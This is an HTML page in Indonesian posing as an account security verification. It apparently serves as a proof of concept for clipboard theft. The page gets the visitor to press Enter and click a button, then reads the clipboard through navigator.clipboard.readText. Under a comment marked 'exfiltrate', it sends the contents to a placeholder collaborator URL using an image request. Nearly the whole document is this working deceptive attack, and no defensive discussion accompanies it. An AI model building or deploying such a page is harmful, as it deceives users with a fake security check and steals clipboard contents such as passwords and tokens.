<!DOCTYPE html>
<html>
<head>
  <title>Validasi Gestur Hybrid</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      margin-top: 30px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>

  <h2>Verifikasi Keamanan Akun</h2>
  <div id="msg">Tekan ENTER untuk memulai verifikasi...</div>
  <button id="btn" style="display:none;">Lanjutkan Verifikasi Dengan cara tekan tombol kemudian hit enter dengan cepat</button>
  <div id="result"></div>

  <script>
    let stage = 0;
    let triggered = false;

    document.addEventListener("keydown", (e) => {
      if (e.key !== "Enter") return;

      if (stage === 0) {
        stage = 1;
        document.getElementById("msg").innerText = "‚úÖ Tahap 1: Gestur keyboard terdeteksi.\nSekarang klik tombol di bawah.";
        document.getElementById("btn").style.display = "inline-block";
      } else if (stage === 2) {
        document.getElementById("msg").innerText = "‚úÖ Verifikasi selesai.";
        document.getElementById("result").innerText = "Terima kasih telah memverifikasi!";
      }
    });

    document.getElementById("btn").addEventListener("click", () => {
      if (stage === 1 && !triggered) {
        triggered = true;
        stage = 2;

        document.getElementById("msg").innerText = "üìã Membaca clipboard...";

        navigator.clipboard.readText()
          .then(text => {
            document.getElementById("result").innerText = "üìã Clipboard:\n" + text;

            // Optional: exfiltrate
            const img = new Image();
            img.src = "https://your-collab-url.net/log?clip=" + encodeURIComponent(text);

            document.getElementById("msg").innerText = "‚úÖ Clipboard berhasil dibaca.\nTekan ENTER untuk menyelesaikan.";
          })
          .catch(err => {
            document.getElementById("msg").innerText = "‚ùå Gagal membaca clipboard: " + err;
          });
      }
    });
  </script>

</body>
</html>
